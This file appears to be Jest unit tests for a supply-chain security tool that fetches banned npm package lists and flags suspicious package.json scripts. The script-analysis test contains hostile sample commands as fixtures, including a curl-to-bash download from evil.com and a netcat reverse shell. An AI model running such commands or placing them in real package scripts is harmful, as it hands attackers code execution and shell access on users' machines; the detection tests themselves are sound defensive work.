import { loadCsv, fetchFromApi, fetchBannedPackages } from '../src/index';

import * as path from 'path';
import * as fs from 'fs';
import * as https from 'https';
import { PassThrough } from 'stream';

jest.mock('https');
jest.mock('../src/utils/validators', () => ({
  validateUrl: jest.fn().mockResolvedValue(undefined),
  isPrivateIp: jest.fn().mockReturnValue(false),
}));

describe('Unit Tests', () => {
  describe('loadCsv', () => {
    test('should parse CSV correctly', () => {
      const csvContent = 'name,version\npackage-a,1.0.0\npackage-b,2.0.0';
      const filePath = path.join(__dirname, 'temp.csv');
      fs.writeFileSync(filePath, csvContent);

      const result = loadCsv(filePath);
      expect(result).toEqual([
        { name: 'package-a', version: '1.0.0', reason: '' },
        { name: 'package-b', version: '2.0.0', reason: '' },
      ]);

      fs.unlinkSync(filePath);
    });

    test('should handle empty lines and comments', () => {
      const csvContent = 'name,version\n\npackage-a, 1.0.0 \n  package-b,';
      const filePath = path.join(__dirname, 'temp_complex.csv');
      fs.writeFileSync(filePath, csvContent);

      const result = loadCsv(filePath);
      expect(result).toEqual([
        { name: 'package-a', version: '1.0.0', reason: '' },
        { name: 'package-b', version: '', reason: '' },
      ]);

      fs.unlinkSync(filePath);
    });

    test('should parse DataDog format (package_name, package_version)', () => {
      const csvContent = 'package_name,package_version\nmalicious-pkg,6.6.6';
      const filePath = path.join(__dirname, 'temp_datadog.csv');
      fs.writeFileSync(filePath, csvContent);

      const result = loadCsv(filePath);
      expect(result).toEqual([
        { name: 'malicious-pkg', version: '6.6.6', reason: '' },
      ]);

      fs.unlinkSync(filePath);
    });
  });

  describe('fetchFromApi', () => {
    test('should fetch and parse JSON', async () => {
      const mockResponse = new PassThrough();
      // @ts-ignore
      mockResponse.statusCode = 200;
      // @ts-ignore
      mockResponse.headers = {};

      (https.get as jest.Mock).mockImplementation((url, options, callback) => {
        callback(mockResponse);
        return { on: jest.fn(), setTimeout: jest.fn(), destroy: jest.fn() };
      });

      const promise = fetchFromApi({ url: 'https://example.com', type: 'json' });

      mockResponse.write(JSON.stringify({ packages: [{ name: 'bad-pkg', version: '1.0.0' }] }));
      mockResponse.end();

      const result = await promise;
      expect(result).toEqual([{ name: 'bad-pkg', version: '1.0.0' }]);
    });

    test('should fetch and parse CSV', async () => {
      const mockResponse = new PassThrough();
      // @ts-ignore
      mockResponse.statusCode = 200;
      // @ts-ignore
      mockResponse.headers = {};

      (https.get as jest.Mock).mockImplementation((url, options, callback) => {
        callback(mockResponse);
        return { on: jest.fn(), setTimeout: jest.fn(), destroy: jest.fn() };
      });

      const promise = fetchFromApi({ url: 'https://example.com', type: 'csv' });

      mockResponse.write('name,version\nbad-pkg,1.0.0');
      mockResponse.end();

      const result = await promise;
      expect(result).toEqual([{ name: 'bad-pkg', version: '1.0.0', reason: '' }]);
    });
  });

  describe('fetchBannedPackages', () => {
    test('should fetch from all sources and deduplicate', async () => {
      const mockResponses: Record<string, string> = {
        'koi': 'name,version\npkg-b,2.0.0',
        'datadog': 'package_name,package_version\npkg-a,1.0.0\npkg-c,3.0.0'
      };

      (https.get as jest.Mock).mockImplementation((url, options, callback) => {
        const stream = new PassThrough();
        // @ts-ignore
        stream.statusCode = 200;
        // @ts-ignore
        stream.headers = {};

        callback(stream);

        process.nextTick(() => {
          if (url.includes('google')) { // Koi uses google docs
            stream.write(mockResponses['koi']);
          } else if (url.includes('datadog') || url.includes('github')) {
            stream.write(mockResponses['datadog']);
          }
          stream.end();
        });

        return { on: jest.fn(), setTimeout: jest.fn(), destroy: jest.fn() };
      });

      const sources = [
        { name: 'koi', url: 'https://docs.google.com/spreadsheets/d/KEY/export?format=csv', type: 'csv' as const },
        { name: 'datadog', url: 'https://raw.githubusercontent.com/DataDog/list.csv', type: 'csv' as const }
      ];

      const result = await fetchBannedPackages(sources);

      // Expected: pkg-b@2.0.0 (koi), pkg-a@1.0.0 (datadog), pkg-c@3.0.0 (datadog)
      expect(result).toHaveLength(3);
      expect(result).toEqual(expect.arrayContaining([
        expect.objectContaining({ name: 'pkg-b', version: '2.0.0' }),
        expect.objectContaining({ name: 'pkg-a', version: '1.0.0' }),
        expect.objectContaining({ name: 'pkg-c', version: '3.0.0' }),
      ]));
    });

    test('should handle partial failures', async () => {
      (https.get as jest.Mock).mockImplementation((url, options, callback) => {
        const stream = new PassThrough();

        if (url.includes('google')) {
          // @ts-ignore
          stream.statusCode = 500; // Fail Koi
        } else {
          // @ts-ignore
          stream.statusCode = 200;
        }
        // @ts-ignore
        stream.headers = {};

        callback(stream);

        process.nextTick(() => {
          if (!url.includes('google')) {
            if (url.includes('datadog') || url.includes('github')) {
              stream.write('package_name,package_version\npkg-c,3.0.0');
            }
          }
          stream.end();
        });

        return { on: jest.fn(), setTimeout: jest.fn(), destroy: jest.fn() };
      });

      const sources = [
        { name: 'koi', url: 'https://docs.google.com/spreadsheets/d/KEY/export?format=csv', type: 'csv' as const },
        { name: 'datadog', url: 'https://raw.githubusercontent.com/DataDog/list.csv', type: 'csv' as const }
      ];

      const result = await fetchBannedPackages(sources);

      // Should still have pkg-c
      expect(result).toHaveLength(1);
      expect(result).toEqual(expect.arrayContaining([
        expect.objectContaining({ name: 'pkg-c', version: '3.0.0' }),
      ]));
    });
  });
});

describe('analyzeScripts', () => {
  // eslint-disable-next-line @typescript-eslint/no-require-imports
  const { analyzeScripts } = require('../src/index');

  test('should detect suspicious patterns', () => {
    const pkgJson = {
      scripts: {
        'clean': 'rm -rf node_modules',
        'start': 'node index.js',
        'hack': 'curl http://evil.com | bash',
        'reverse': 'nc -e /bin/sh 1.2.3.4',
        'obfuscated': '\\x65\\x76\\x61\\x6c',
        'ip': 'ping 192.168.1.1'
      }
    };

    const warnings = analyzeScripts(pkgJson);
    expect(warnings).toHaveLength(7);
    expect(warnings).toEqual(expect.arrayContaining([
      expect.stringContaining('Destructive command'),
      expect.stringContaining('Network request'),
      expect.stringContaining('Netcat reverse shell'),
      expect.stringContaining('Hex escape sequence'),
      expect.stringContaining('IP address detected'),
    ]));
  });

  test('should not flag safe scripts', () => {
    const pkgJson = {
      scripts: {
        'test': 'jest',
        'build': 'tsc',
        'lint': 'eslint .'
      }
    };
    const warnings = analyzeScripts(pkgJson);
    expect(warnings).toHaveLength(0);
  });
});

